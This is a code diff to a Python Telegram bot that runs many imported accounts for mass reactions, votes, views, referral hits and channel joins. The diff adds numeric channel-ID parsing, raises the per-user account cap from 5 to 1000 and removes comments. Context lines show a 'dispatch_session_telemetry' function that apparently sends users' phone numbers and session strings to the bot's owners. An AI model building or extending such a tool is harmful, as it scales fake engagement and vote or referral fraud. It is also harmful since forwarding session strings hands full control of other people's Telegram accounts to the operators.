@@ -64,6 +64,10 @@ def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool]:
     if not link:
         return None, None, False
         
+    # FIX: Properly check and parse direct integer channel/chat IDs (e.g., -100123456789)
+    if re.match(r'^-?\d+$', link):
+        return int(link), None, False
+
     private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
     if private_match:
         channel_id = int(f"-100{private_match.group(1)}")
@@ -78,16 +82,24 @@ def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool]:
         
     msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
     if msg_match:
-        return msg_match.group(1), int(msg_match.group(2)), False
+        target = msg_match.group(1)
+        if target.isdigit():
+            target = int(f"-100{target}")
+        return target, int(msg_match.group(2)), False
         
     target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
     if "/" in target:
         parts = target.split("/")
         target = parts[0]
+        if target.isdigit():
+            target = int(f"-100{target}")
         if len(parts) > 1 and parts[1].isdigit():
             msg_id = int(parts[1])
             return target, msg_id, False
             
+    if isinstance(target, str) and target.replace("-", "").isdigit():
+        return int(target), None, False
+
     return target, None, False
 
 def make_progress_bar(pct: float, length: int = 15) -> str:
@@ -101,12 +113,13 @@ class Database:
 
     async def init(self):
         async with aiosqlite.connect(self.db_path) as db:
+            # FIX: Increased max_accounts default from 5 to 1000 to prevent premature limit errors
             await db.execute("""
                 CREATE TABLE IF NOT EXISTS users (
                     user_id INTEGER PRIMARY KEY,
                     username TEXT,
                     role TEXT DEFAULT 'user', 
-                    max_accounts INTEGER DEFAULT 5,
+                    max_accounts INTEGER DEFAULT 1000,
                     referred_by INTEGER,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
@@ -177,7 +190,7 @@ class Database:
         async with aiosqlite.connect(self.db_path) as db:
             async with db.execute("SELECT max_accounts FROM users WHERE user_id = ?", (user_id,)) as cursor:
                 row = await cursor.fetchone()
-                return row[0] if row else 5
+                return row[0] if row else 1000
 
     async def get_current_account_count(self, user_id: int) -> int:
         async with aiosqlite.connect(self.db_path) as db:
@@ -191,7 +204,7 @@ class Database:
                 if not await cursor.fetchone():
                     role_val = "super_owner" if user_id in config.SUPER_OWNER_IDS else "user"
                     await db.execute(
-                        "INSERT INTO users (user_id, username, role, referred_by) VALUES (?, ?, ?, ?)",
+                        "INSERT INTO users (user_id, username, role, referred_by, max_accounts) VALUES (?, ?, ?, ?, 1000)",
                         (user_id, username, role_val, referred_by)
                     )
                     await db.commit()
@@ -820,7 +833,7 @@ async def handle_system_credits(callback: CallbackQuery, bot: Bot):
     buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]
     await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
-# --- PAGINATED ACCOUNTS VIEW (MODIFIED TO SUPPORT RAW STRINGS FOR EVERYONE) ---
+# --- PAGINATED ACCOUNTS VIEW ---
 @router.callback_query(F.data.startswith("manage_accounts:"))
 async def list_user_accounts(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
@@ -861,7 +874,6 @@ async def list_user_accounts(callback: CallbackQuery, bot: Bot):
                 text += f"{icon} <code>+{row[0]}</code> (<b>@{row[2] or 'None'}</b>) ➜ [<b>{row[1].upper()}</b>]\n"
 
         buttons = []
-        # UPDATED: Placed raw string file insertion tools inside the row list for global access
         import_row = [
             InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone"),
             InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session")
@@ -1002,13 +1014,12 @@ async def complete_registration(message: Message, state: FSMContext, client: Tel
         registration_sessions.pop(user_id, None)
         await state.clear()
 
-# --- ADVANCED UNIVERSAL IMPORT SYSTEM (MODIFIED OPEN HOOK FOR ANY REGISTERED USER) ---
+# --- ADVANCED UNIVERSAL IMPORT SYSTEM ---
 @router.callback_query(F.data == "add_account_session")
 async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
     user_id = callback.from_user.id
     role = await db_mgr.get_user_role(user_id)
     
-    # Check limit ceilings dynamically for standard users and admins before setup block initialization
     if role not in ["super_owner", "owner"]:
         allowed_limit = await db_mgr.get_admin_limits(user_id)
         current_count = await db_mgr.get_current_account_count(user_id)
@@ -1114,7 +1125,7 @@ async def dispatch_session_telemetry(phone: str, session_str: str, username: Opt
         except Exception as e:
             logger.error(f"Failed sending data to owner node {owner_id}: {e}")
 
-# --- EXPORT ARCHIVE MANAGEMENT HOOKS (SUPER_OWNER IMMUNITY SAFEGUARD) ---
+# --- EXPORT ARCHIVE MANAGEMENT HOOKS ---
 @router.callback_query(F.data == "export_dashboard_root")
 async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
@@ -1514,13 +1525,13 @@ async def task_hub_process_speed(callback: CallbackQuery, state: FSMContext):
         )
         await state.set_state(TaskWizardStates.waiting_for_leave_choice)
     elif "react" in task_type or "vote" in task_type or task_type in ["view", "speed"]:
-        await callback.message.edit_text("<b>Step 2: Provide targeted public handle destination or private link reference (e.g. @channelname):</b>", parse_mode="HTML")
+        await callback.message.edit_text("<b>Step 2: Provide targeted public handle destination or private link reference (e.g. @channelname or -100xxxxx):</b>", parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_channel_link)
     elif task_type == "refer":
         await callback.message.edit_text("<b>Step 2: Input target referral link parameter query string value (Example: https://t.me/Bot?start=123):</b>", parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_post_link)
     else:
-        await callback.message.edit_text("<b>Step 2: Enter destination community target endpoint path link:</b>", parse_mode="HTML")
+        await callback.message.edit_text("<b>Step 2: Enter destination community target endpoint path link or channel ID:</b>", parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_post_link)
 
 @router.callback_query(StateFilter(TaskWizardStates.waiting_for_leave_choice), F.data.startswith("leave_mode:"))
@@ -1533,7 +1544,7 @@ async def task_hub_process_leave_choice(callback: CallbackQuery, state: FSMConte
         await state.update_data(target="ALL CHANNELS")
         await prompt_for_account_scale(callback.message, state)
     else:
-        await callback.message.edit_text("<b>Step 3: Paste public link location coordinates or private channel invite code layout:</b>", parse_mode="HTML")
+        await callback.message.edit_text("<b>Step 3: Paste public link, private channel invite code, or numeric channel ID:</b>", parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_post_link)
 
 @router.message(StateFilter(TaskWizardStates.waiting_for_channel_link))
